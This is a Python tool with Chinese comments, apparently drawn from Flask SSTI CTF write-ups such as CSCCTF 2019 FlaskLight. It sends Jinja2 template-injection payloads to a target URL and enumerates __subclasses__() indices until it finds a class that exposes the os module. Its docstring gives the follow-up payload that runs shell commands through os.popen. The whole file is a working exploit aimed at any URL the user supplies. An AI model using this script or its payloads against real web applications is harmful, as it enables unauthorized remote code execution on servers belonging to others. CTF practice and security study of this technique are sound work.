# -*- coding: utf-8 -*-
"""SSTIFindSubprocess.py SSTI 遍历 __subclasses__ 定位 os 模块索引

来源: WP 汇总/[CSCCTF 2019 Qual]FlaskLight 等 Flask SSTI 题
用途: SSTI 拿 RCE 前先确定 `().__class__.__bases__[0].__subclasses__()[i]`
      中含 os 的类的下标 i(各环境不同, 必须现场枚举)。
      命中后即可:
      {{ [].__class__.__bases__[0].__subclasses__()[i].__init__.__globals__['os'].popen('ls').read() }}

依赖:
    pip install requests

用法(实战, 需网络):
    python SSTIFindSubprocess.py -u "http://target/?search="
    python SSTIFindSubprocess.py -u "http://target/?search=" -k popen --limit 600
"""
import argparse
import sys

import requests


def find_os_index(url, keyword='os', limit=1000):
    """逐个下标请求, 响应中出现 keyword(如 'os')即认为命中, 返回下标列表。"""
    hits = []
    for i in range(1, limit):
        payload = "{{[].__class__.__bases__[0].__subclasses__()[%s]}}" % i
        try:
            r = requests.get(url + payload, timeout=8).text
        except requests.RequestException as e:
            print('[-] 网络错误, 中止: %s' % e)
            break
        if keyword in r:
            print(str(i) + 'yes')
            hits.append(i)
    return hits


def main():
    ap = argparse.ArgumentParser(description='SSTI 遍历子类定位 os 索引')
    ap.add_argument('-u', '--url', required=True,
                    help='注入点 URL, 以参数前缀结尾, 如 http://x/?search=')
    ap.add_argument('-k', '--keyword', default='os',
                    help='响应中判定命中的关键词(默认 os)')
    ap.add_argument('--limit', type=int, default=1000, help='最大下标')
    args = ap.parse_args()

    if getattr(sys.stdout, 'reconfigure', None):
        try:
            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        except Exception:
            pass

    hits = find_os_index(args.url, args.keyword, args.limit)
    print('[*] 命中下标: %s' % (hits or '无'))
    return 0


if __name__ == '__main__':
    sys.exit(main())
